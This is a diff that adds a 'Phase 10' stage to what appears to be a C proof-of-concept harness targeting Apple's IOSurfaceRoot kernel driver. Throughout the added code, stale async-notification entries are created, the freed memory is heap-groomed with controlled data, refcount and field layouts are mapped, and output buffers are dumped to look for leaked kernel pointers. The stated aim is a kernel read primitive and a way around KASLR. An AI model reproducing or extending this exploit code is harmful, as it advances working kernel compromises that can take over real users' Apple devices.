@@ -17815,6 +17815,496 @@ new_modes:
         if (test_surf) CFRelease(test_surf);
         IOServiceClose(conn);
 
+        /* ================================================================
+         * Phase 10: PoC stages E3-E7 — content-dependence, output dump,
+         * field mapping, refcnt decrement, KASLR leak hunt
+         * ================================================================ */
+        rlog("\n--- Phase 10: Advanced stale-read analysis (E3-E7 pattern) ---\n");
+        {
+            io_service_t svc10 = IOServiceGetMatchingService(
+                kIOMasterPortDefault,
+                IOServiceMatching("IOSurfaceRoot"));
+            if (!svc10) {
+                rlog("  Phase 10: service lookup failed\n");
+                goto phase10_done;
+            }
+            io_connect_t c10 = IO_OBJECT_NULL;
+            kern_return_t kr10 = IOServiceOpen(svc10, mach_task_self(), 0, &c10);
+            IOObjectRelease(svc10);
+            if (kr10 || !c10) {
+                rlog("  Phase 10: open failed 0x%x\n", (uint32_t)kr10);
+                goto phase10_done;
+            }
+
+            uint64_t p10in[3] = {1, 2, 3};
+            int p10shape = 1; /* async+nonzero_ref — confirmed working */
+
+            /* Helper: callSel10 — inline to avoid macro complexity */
+            #define CALLSEL10_REG(conn, wp, ref, buf, sz) \
+                IOConnectCallAsyncMethod((conn), 17, (wp), &(ref), 1, NULL, 0, (buf), (sz), NULL, NULL, NULL, NULL)
+            #define CALLSEL10_DEREG(conn, buf, sz) \
+                IOConnectCallMethod((conn), 18, NULL, 0, (buf), (sz), NULL, NULL, NULL, NULL)
+
+            /* ---- 10a: E3 false-positive control (no-groom stale dup) ---- */
+            rlog("  10a: E3 false-positive control\n");
+            {
+                int k1c9 = 0;
+                for (int i = 0; i < 10; i++) {
+                    mach_port_t wp10 = MACH_PORT_NULL;
+                    mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &wp10);
+                    mach_port_insert_right(mach_task_self(), wp10, wp10, MACH_MSG_TYPE_MAKE_SEND);
+                    uint64_t ref10 = 0x1122334455667788ULL;
+                    CALLSEL10_REG(c10, wp10, ref10, p10in, 24);
+                    CALLSEL10_DEREG(c10, p10in, 24);
+                    /* Re-reg on stale entry WITHOUT groom */
+                    kern_return_t r = CALLSEL10_REG(c10, wp10, ref10, p10in, 24);
+                    if ((uint32_t)r == 0xE00002C9) k1c9++;
+                    /* cleanup: dereg the entry we just registered */
+                    CALLSEL10_DEREG(c10, p10in, 24);
+                    mach_port_deallocate(mach_task_self(), wp10);
+                    usleep(2000);
+                }
+                rlog("    K1 no-groom stale dup==DupReg: %d/10 (expect ~10 = no false-positive)\n", k1c9);
+            }
+
+            /* ---- 10b: E5 content-dependence — does dup result depend on groom content? ---- */
+            rlog("  10b: E5 content-dependence test\n");
+            {
+                /* Groom connection for all 10b/10c/10d tests */
+                io_service_t gsvc10 = IOServiceGetMatchingService(
+                    kIOMasterPortDefault, IOServiceMatching("IOSurfaceRoot"));
+                io_connect_t gc10 = IO_OBJECT_NULL;
+                if (gsvc10) {
+                    IOServiceOpen(gsvc10, mach_task_self(), 0, &gc10);
+                    IOObjectRelease(gsvc10);
+                }
+                if (!gc10) {
+                    rlog("    groom connection failed\n");
+                    goto phase10b_done;
+                }
+
+                /* Test A: f[1]=marker (not matching input) */
+                /* Test B: f[1]=1 (matches in[0]) */
+                /* Test C: f[1]=0xdead (different non-matching) */
+                struct { const char *name; uint64_t f1val; } cases[3] = {
+                    {"A_marker", 0xAABBCCDDEEFF0011ULL},
+                    {"B_f1=1",   1},
+                    {"C_f1=dead", 0xDEAD}
+                };
+                for (int t = 0; t < 3; t++) {
+                    int hits = 0;
+                    uint32_t lastDup = 0;
+                    for (int i = 0; i < 5; i++) {
+                        mach_port_t wp10 = MACH_PORT_NULL;
+                        mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &wp10);
+                        mach_port_insert_right(mach_task_self(), wp10, wp10, MACH_MSG_TYPE_MAKE_SEND);
+                        uint64_t ref10 = 0x1122334455667788ULL;
+
+                        CALLSEL10_REG(c10, wp10, ref10, p10in, 24);
+                        CALLSEL10_DEREG(c10, p10in, 24);
+
+                        /* Groom with specific f[1] value */
+                        uint8_t fbuf10[64];
+                        memset(fbuf10, 0, sizeof(fbuf10));
+                        uint64_t *f10 = (uint64_t *)fbuf10;
+                        f10[0] = 0x21;          /* refcnt */
+                        f10[1] = cases[t].f1val; /* id field under test */
+                        f10[2] = 0x4141414141414141ULL; /* canary */
+
+                        mach_port_t g_wps10[256];
+                        int g_cnt10 = 0;
+                        for (int gi = 0; gi < 256; gi++) {
+                            mach_port_t gwp = MACH_PORT_NULL;
+                            mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &gwp);
+                            mach_port_insert_right(mach_task_self(), gwp, gwp, MACH_MSG_TYPE_MAKE_SEND);
+                            uint64_t gref = 0xA1B2C3D4E5F60708ULL;
+                            g_wps10[gi] = MACH_PORT_NULL;
+                            kern_return_t gr = IOConnectCallAsyncMethod(gc10, 1000, gwp, &gref, 1,
+                                NULL, 0, fbuf10, 24, NULL, NULL, NULL, NULL);
+                            if (gr == 0 || gr == (kern_return_t)0xE00002C2) {
+                                g_wps10[gi] = gwp;
+                                g_cnt10++;
+                            } else {
+                                mach_port_deallocate(mach_task_self(), gwp);
+                            }
+                        }
+
+                        kern_return_t rdup = CALLSEL10_REG(c10, wp10, ref10, p10in, 24);
+                        if ((uint32_t)rdup != 0xE00002C9) hits++;
+                        lastDup = (uint32_t)rdup;
+
+                        CALLSEL10_DEREG(c10, p10in, 24);
+                        for (int gi = 0; gi < 256; gi++)
+                            if (g_wps10[gi]) mach_port_deallocate(mach_task_self(), g_wps10[gi]);
+                        mach_port_deallocate(mach_task_self(), wp10);
+                        usleep(2000);
+                    }
+                    rlog("    %s: hits=%d/5 lastDup=0x%x\n", cases[t].name, hits, lastDup);
+                }
+
+                /* ---- 10c: E6 output dump — DUP with structureOutput on stale entry ---- */
+                /* THIS IS THE CRITICAL TEST: if kernel writes data back to output buffer
+                   from the stale/groomed entry, we get a kernel read primitive! */
+                rlog("  10c: E6 dup output dump (potential kernel data leak)\n");
+                {
+                    mach_port_t wp10 = MACH_PORT_NULL;
+                    mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &wp10);
+                    mach_port_insert_right(mach_task_self(), wp10, wp10, MACH_MSG_TYPE_MAKE_SEND);
+                    uint64_t ref10 = 0x1122334455667788ULL;
+
+                    CALLSEL10_REG(c10, wp10, ref10, p10in, 24);
+                    CALLSEL10_DEREG(c10, p10in, 24);
+
+                    /* Groom with distinctive pattern */
+                    uint8_t fbuf10[64];
+                    memset(fbuf10, 0, sizeof(fbuf10));
+                    uint64_t *f10 = (uint64_t *)fbuf10;
+                    f10[0] = 0x21;
+                    f10[1] = 0xAABBCCDDEEFF0011ULL;
+                    f10[2] = 0x1234567890ABCDEFULL;
+
+                    mach_port_t g_wps10[256];
+                    int g_cnt10 = 0;
+                    for (int gi = 0; gi < 256; gi++) {
+                        mach_port_t gwp = MACH_PORT_NULL;
+                        mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &gwp);
+                        mach_port_insert_right(mach_task_self(), gwp, gwp, MACH_MSG_TYPE_MAKE_SEND);
+                        uint64_t gref = 0xA1B2C3D4E5F60708ULL;
+                        g_wps10[gi] = MACH_PORT_NULL;
+                        kern_return_t gr = IOConnectCallAsyncMethod(gc10, 1000, gwp, &gref, 1,
+                            NULL, 0, fbuf10, 24, NULL, NULL, NULL, NULL);
+                        if (gr == 0 || gr == (kern_return_t)0xE00002C2) {
+                            g_wps10[gi] = gwp;
+                            g_cnt10++;
+                        } else {
+                            mach_port_deallocate(mach_task_self(), gwp);
+                        }
+                    }
+
+                    /* Async dup WITH output buffer */
+                    uint8_t out10[256];
+                    uint32_t olen10 = sizeof(out10);
+                    memset(out10, 0xCC, sizeof(out10));
+                    kern_return_t r10a = IOConnectCallAsyncMethod(c10, 17, wp10, &ref10, 1,
+                        NULL, 0, p10in, 24, out10, &olen10, NULL, NULL);
+                    rlog("    async dup-out rc=0x%x olen=%u\n", (uint32_t)r10a, olen10);
+                    if (r10a == 0 && olen10 > 0) {
+                        for (uint32_t o = 0; o + 8 <= olen10 && o < 128; o += 8) {
+                            uint64_t v = 0;
+                            memcpy(&v, out10 + o, 8);
+                            rlog("    out[%u]=0x%016llx", o, (unsigned long long)v);
+                            /* Check for kernel pointers */
+                            if ((v & 0xFFFFFF0000000000ULL) == 0xFFFFFE0000000000ULL ||
+                                (v & 0xFFFFFF0000000000ULL) == 0xFFFFFF0000000000ULL) {
+                                if (v != 0xFFFFFFFFFFFFFFFFULL)
+                                    rlog(" ** KPTR **");
+                            }
+                            /* Check for our groom markers */
+                            if (v == 0xAABBCCDDEEFF0011ULL) rlog(" [GROOM-MARKER]");
+                            if (v == 0x1234567890ABCDEFULL) rlog(" [GROOM-ADDR]");
+                            if (v == 0x21) rlog(" [GROOM-REFCNT]");
+                            rlog("\n");
+                        }
+                    }
+
+                    /* Sync dup WITH output buffer (may differ) */
+                    uint8_t out10s[256];
+                    uint32_t olen10s = sizeof(out10s);
+                    memset(out10s, 0xCC, sizeof(out10s));
+                    /* Need a fresh stale entry for sync test */
+                    CALLSEL10_DEREG(c10, p10in, 24);
+                    CALLSEL10_REG(c10, wp10, ref10, p10in, 24);
+                    CALLSEL10_DEREG(c10, p10in, 24);
+                    /* Re-groom */
+                    for (int gi = 0; gi < 256; gi++)
+                        if (g_wps10[gi]) mach_port_deallocate(mach_task_self(), g_wps10[gi]);
+                    g_cnt10 = 0;
+                    for (int gi = 0; gi < 256; gi++) {
+                        mach_port_t gwp = MACH_PORT_NULL;
+                        mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &gwp);
+                        mach_port_insert_right(mach_task_self(), gwp, gwp, MACH_MSG_TYPE_MAKE_SEND);
+                        uint64_t gref = 0xA1B2C3D4E5F60708ULL;
+                        g_wps10[gi] = MACH_PORT_NULL;
+                        kern_return_t gr = IOConnectCallAsyncMethod(gc10, 1000, gwp, &gref, 1,
+                            NULL, 0, fbuf10, 24, NULL, NULL, NULL, NULL);
+                        if (gr == 0 || gr == (kern_return_t)0xE00002C2) {
+                            g_wps10[gi] = gwp;
+                            g_cnt10++;
+                        } else {
+                            mach_port_deallocate(mach_task_self(), gwp);
+                        }
+                    }
+                    kern_return_t r10s = IOConnectCallMethod(c10, 17, NULL, 0, p10in, 24,
+                        NULL, NULL, out10s, &olen10s);
+                    rlog("    sync dup-out rc=0x%x olen=%u\n", (uint32_t)r10s, olen10s);
+                    if (r10s == 0 && olen10s > 0) {
+                        for (uint32_t o = 0; o + 8 <= olen10s && o < 128; o += 8) {
+                            uint64_t v = 0;
+                            memcpy(&v, out10s + o, 8);
+                            rlog("    sync-out[%u]=0x%016llx", o, (unsigned long long)v);
+                            if ((v & 0xFFFFFF0000000000ULL) == 0xFFFFFE0000000000ULL ||
+                                (v & 0xFFFFFF0000000000ULL) == 0xFFFFFF0000000000ULL) {
+                                if (v != 0xFFFFFFFFFFFFFFFFULL)
+                                    rlog(" ** KPTR **");
+                            }
+                            if (v == 0xAABBCCDDEEFF0011ULL) rlog(" [GROOM-MARKER]");
+                            if (v == 0x1234567890ABCDEFULL) rlog(" [GROOM-ADDR]");
+                            rlog("\n");
+                        }
+                    }
+
+                    /* Baseline: dup on a LIVE entry with output buffer */
+                    CALLSEL10_DEREG(c10, p10in, 24);
+                    for (int gi = 0; gi < 256; gi++)
+                        if (g_wps10[gi]) mach_port_deallocate(mach_task_self(), g_wps10[gi]);
+                    CALLSEL10_REG(c10, wp10, ref10, p10in, 24);
+                    uint8_t out10b[256];
+                    uint32_t olen10b = sizeof(out10b);
+                    memset(out10b, 0xCC, sizeof(out10b));
+                    kern_return_t r10b = CALLSEL10_REG(c10, wp10, ref10, p10in, 24);
+                    rlog("    baseline dup-out rc=0x%x olen=%u\n", (uint32_t)r10b, olen10b);
+                    if (r10b == 0 && olen10b > 0) {
+                        for (uint32_t o = 0; o + 8 <= olen10b && o < 128; o += 8) {
+                            uint64_t v = 0;
+                            memcpy(&v, out10b + o, 8);
+                            rlog("    base-out[%u]=0x%016llx", o, (unsigned long long)v);
+                            if ((v & 0xFFFFFF0000000000ULL) == 0xFFFFFE0000000000ULL ||
+                                (v & 0xFFFFFF0000000000ULL) == 0xFFFFFF0000000000ULL) {
+                                if (v != 0xFFFFFFFFFFFFFFFFULL)
+                                    rlog(" ** KPTR **");
+                            }
+                            rlog("\n");
+                        }
+                    }
+                    CALLSEL10_DEREG(c10, p10in, 24);
+                    mach_port_deallocate(mach_task_self(), wp10);
+                }
+
+                /* ---- 10d: E4/E7 field mapping — refcnt sweep + dereg decrement ---- */
+                rlog("  10d: E4 refcnt sweep (f[0] = 0, 1, 0x21)\n");
+                {
+                    uint64_t f0vals[3] = {0, 1, 0x21};
+                    for (int v = 0; v < 3; v++) {
+                        int hits = 0;
+                        uint32_t lastDup = 0, lastDreg = 0;
+                        for (int i = 0; i < 5; i++) {
+                            mach_port_t wp10 = MACH_PORT_NULL;
+                            mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &wp10);
+                            mach_port_insert_right(mach_task_self(), wp10, wp10, MACH_MSG_TYPE_MAKE_SEND);
+                            uint64_t ref10 = 0x1122334455667788ULL;
+
+                            CALLSEL10_REG(c10, wp10, ref10, p10in, 24);
+                            CALLSEL10_REG(c10, wp10, ref10, p10in, 24); /* dup baseline */
+                            CALLSEL10_DEREG(c10, p10in, 24);
+
+                            /* Groom with custom f[0] */
+                            uint8_t fbuf10[64];
+                            memset(fbuf10, 0, sizeof(fbuf10));
+                            uint64_t *f10 = (uint64_t *)fbuf10;
+                            f10[0] = f0vals[v];
+                            f10[1] = 0xAABBCCDDEEFF0011ULL;
+                            f10[2] = 0x4141414141414141ULL;
+
+                            mach_port_t g_wps10[256];
+                            for (int gi = 0; gi < 256; gi++) {
+                                mach_port_t gwp = MACH_PORT_NULL;
+                                mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &gwp);
+                                mach_port_insert_right(mach_task_self(), gwp, gwp, MACH_MSG_TYPE_MAKE_SEND);
+                                uint64_t gref = 0xA1B2C3D4E5F60708ULL;
+                                g_wps10[gi] = MACH_PORT_NULL;
+                                kern_return_t gr = IOConnectCallAsyncMethod(gc10, 1000, gwp, &gref, 1,
+                                    NULL, 0, fbuf10, 24, NULL, NULL, NULL, NULL);
+                                if (gr == 0 || gr == (kern_return_t)0xE00002C2)
+                                    g_wps10[gi] = gwp;
+                                else
+                                    mach_port_deallocate(mach_task_self(), gwp);
+                            }
+
+                            kern_return_t rdup = CALLSEL10_REG(c10, wp10, ref10, p10in, 24);
+                            kern_return_t rdreg = CALLSEL10_DEREG(c10, p10in, 24);
+                            if ((uint32_t)rdup != 0xE00002C9) hits++;
+                            lastDup = (uint32_t)rdup;
+                            lastDreg = (uint32_t)rdreg;
+
+                            for (int gi = 0; gi < 256; gi++)
+                                if (g_wps10[gi]) mach_port_deallocate(mach_task_self(), g_wps10[gi]);
+                            mach_port_deallocate(mach_task_self(), wp10);
+                            usleep(2000);
+                        }
+                        rlog("    f0=0x%llx hits=%d/5 dup=0x%x dereg=0x%x\n",
+                             (unsigned long long)f0vals[v], hits, lastDup, lastDreg);
+                    }
+                }
+
+                /* ---- 10e: E7 refcnt-decrement probe: serial dereg on groomed entry ---- */
+                rlog("  10e: E7 refcnt decrement (serial dereg on groomed stale)\n");
+                {
+                    uint64_t f0trials[4] = {1, 2, 3, 0x21};
+                    for (int trial = 0; trial < 4; trial++) {
+                        mach_port_t wp10 = MACH_PORT_NULL;
+                        mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &wp10);
+                        mach_port_insert_right(mach_task_self(), wp10, wp10, MACH_MSG_TYPE_MAKE_SEND);
+                        uint64_t ref10 = 0x1122334455667788ULL;
+
+                        CALLSEL10_REG(c10, wp10, ref10, p10in, 24);
+                        CALLSEL10_DEREG(c10, p10in, 24);
+
+                        uint8_t fbuf10[64];
+                        memset(fbuf10, 0, sizeof(fbuf10));
+                        uint64_t *f10 = (uint64_t *)fbuf10;
+                        f10[0] = f0trials[trial];
+                        f10[1] = 0xAABBCCDDEEFF0011ULL;
+                        f10[2] = 0;
+
+                        mach_port_t g_wps10[256];
+                        for (int gi = 0; gi < 256; gi++) {
+                            mach_port_t gwp = MACH_PORT_NULL;
+                            mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &gwp);
+                            mach_port_insert_right(mach_task_self(), gwp, gwp, MACH_MSG_TYPE_MAKE_SEND);
+                            uint64_t gref = 0xA1B2C3D4E5F60708ULL;
+                            g_wps10[gi] = MACH_PORT_NULL;
+                            kern_return_t gr = IOConnectCallAsyncMethod(gc10, 1000, gwp, &gref, 1,
+                                NULL, 0, fbuf10, 24, NULL, NULL, NULL, NULL);
+                            if (gr == 0 || gr == (kern_return_t)0xE00002C2)
+                                g_wps10[gi] = gwp;
+                            else
+                                mach_port_deallocate(mach_task_self(), gwp);
+                        }
+
+                        rlog("    f0=%llu dereg-seq:", (unsigned long long)f0trials[trial]);
+                        for (int k = 0; k < 6; k++) {
+                            kern_return_t rd = CALLSEL10_DEREG(c10, p10in, 24);
+                            rlog(" d%d=0x%x", k + 1, (uint32_t)rd);
+                            if (rd != 0 && (uint32_t)rd != 0xE00002C9) { rlog("[BREAK]"); break; }
+                        }
+                        kern_return_t rfinal = CALLSEL10_REG(c10, wp10, ref10, p10in, 24);
+                        rlog(" final-dup=0x%x\n", (uint32_t)rfinal);
+
+                        CALLSEL10_DEREG(c10, p10in, 24);
+                        for (int gi = 0; gi < 256; gi++)
+                            if (g_wps10[gi]) mach_port_deallocate(mach_task_self(), g_wps10[gi]);
+                        mach_port_deallocate(mach_task_self(), wp10);
+                        usleep(2000);
+                    }
+                }
+
+                /* ---- 10f: E7 zero-ctrl vs content — same dup behavior? ---- */
+                rlog("  10f: zero-buf vs content-buf control\n");
+                {
+                    for (int variant = 0; variant < 2; variant++) {
+                        int hits = 0;
+                        uint32_t lastDup = 0;
+                        for (int i = 0; i < 5; i++) {
+                            mach_port_t wp10 = MACH_PORT_NULL;
+                            mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &wp10);
+                            mach_port_insert_right(mach_task_self(), wp10, wp10, MACH_MSG_TYPE_MAKE_SEND);
+                            uint64_t ref10 = 0x1122334455667788ULL;
+
+                            CALLSEL10_REG(c10, wp10, ref10, p10in, 24);
+                            CALLSEL10_DEREG(c10, p10in, 24);
+
+                            uint8_t fbuf10[64];
+                            memset(fbuf10, 0, sizeof(fbuf10));
+                            if (variant == 1) {
+                                uint64_t *f10 = (uint64_t *)fbuf10;
+                                f10[0] = 0x21;
+                                f10[1] = 0xAABBCCDDEEFF0011ULL;
+                                f10[2] = 0x1234567890ABCDEFULL;
+                            }
+
+                            mach_port_t g_wps10[256];
+                            for (int gi = 0; gi < 256; gi++) {
+                                mach_port_t gwp = MACH_PORT_NULL;
+                                mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &gwp);
+                                mach_port_insert_right(mach_task_self(), gwp, gwp, MACH_MSG_TYPE_MAKE_SEND);
+                                uint64_t gref = 0xA1B2C3D4E5F60708ULL;
+                                g_wps10[gi] = MACH_PORT_NULL;
+                                kern_return_t gr = IOConnectCallAsyncMethod(gc10, 1000, gwp, &gref, 1,
+                                    NULL, 0, fbuf10, 24, NULL, NULL, NULL, NULL);
+                                if (gr == 0 || gr == (kern_return_t)0xE00002C2)
+                                    g_wps10[gi] = gwp;
+                                else
+                                    mach_port_deallocate(mach_task_self(), gwp);
+                            }
+
+                            kern_return_t rdup = CALLSEL10_REG(c10, wp10, ref10, p10in, 24);
+                            if ((uint32_t)rdup == 0) hits++;
+                            lastDup = (uint32_t)rdup;
+
+                            CALLSEL10_DEREG(c10, p10in, 24);
+                            for (int gi = 0; gi < 256; gi++)
+                                if (g_wps10[gi]) mach_port_deallocate(mach_task_self(), g_wps10[gi]);
+                            mach_port_deallocate(mach_task_self(), wp10);
+                            usleep(2000);
+                        }
+                        rlog("    %s: hits=%d/5 lastDup=0x%x\n",
+                             variant ? "content" : "zero", hits, lastDup);
+                    }
+                }
+
+                /* ---- 10g: E6 slot-shift — which qword position holds the entry key? ---- */
+                rlog("  10g: slot-shift (f0=0x21 at different positions)\n");
+                {
+                    for (int slot = 0; slot < 3; slot++) {
+                        int hits = 0;
+                        uint32_t lastDup = 0;
+                        for (int i = 0; i < 5; i++) {
+                            mach_port_t wp10 = MACH_PORT_NULL;
+                            mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &wp10);
+                            mach_port_insert_right(mach_task_self(), wp10, wp10, MACH_MSG_TYPE_MAKE_SEND);
+                            uint64_t ref10 = 0x1122334455667788ULL;
+
+                            CALLSEL10_REG(c10, wp10, ref10, p10in, 24);
+                            CALLSEL10_DEREG(c10, p10in, 24);
+
+                            uint8_t fbuf10[64];
+                            memset(fbuf10, 0, sizeof(fbuf10));
+                            uint64_t *f10 = (uint64_t *)fbuf10;
+                            f10[0] = 0x4141414141414141ULL;
+                            f10[1] = 0x4141414141414141ULL;
+                            f10[2] = 0x4141414141414141ULL;
+                            f10[slot] = 0x21;
+
+                            mach_port_t g_wps10[256];
+                            for (int gi = 0; gi < 256; gi++) {
+                                mach_port_t gwp = MACH_PORT_NULL;
+                                mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &gwp);
+                                mach_port_insert_right(mach_task_self(), gwp, gwp, MACH_MSG_TYPE_MAKE_SEND);
+                                uint64_t gref = 0xA1B2C3D4E5F60708ULL;
+                                g_wps10[gi] = MACH_PORT_NULL;
+                                kern_return_t gr = IOConnectCallAsyncMethod(gc10, 1000, gwp, &gref, 1,
+                                    NULL, 0, fbuf10, 24, NULL, NULL, NULL, NULL);
+                                if (gr == 0 || gr == (kern_return_t)0xE00002C2)
+                                    g_wps10[gi] = gwp;
+                                else
+                                    mach_port_deallocate(mach_task_self(), gwp);
+                            }
+
+                            kern_return_t rdup = CALLSEL10_REG(c10, wp10, ref10, p10in, 24);
+                            if ((uint32_t)rdup != 0xE00002C9) hits++;
+                            lastDup = (uint32_t)rdup;
+
+                            CALLSEL10_DEREG(c10, p10in, 24);
+                            for (int gi = 0; gi < 256; gi++)
+                                if (g_wps10[gi]) mach_port_deallocate(mach_task_self(), g_wps10[gi]);
+                            mach_port_deallocate(mach_task_self(), wp10);
+                            usleep(2000);
+                        }
+                        rlog("    slot%d=0x21 hits=%d/5 dup=0x%x\n", slot, hits, lastDup);
+                    }
+                }
+
+                IOServiceClose(gc10);
+            }
+            phase10b_done:
+
+            #undef CALLSEL10_REG
+            #undef CALLSEL10_DEREG
+            IOServiceClose(c10);
+        }
+        phase10_done:
+        rlog("--- Phase 10 complete ---\n");
+
         rlog("\n=== IOSURFACE_SEL17 complete ===\n");
     }
 
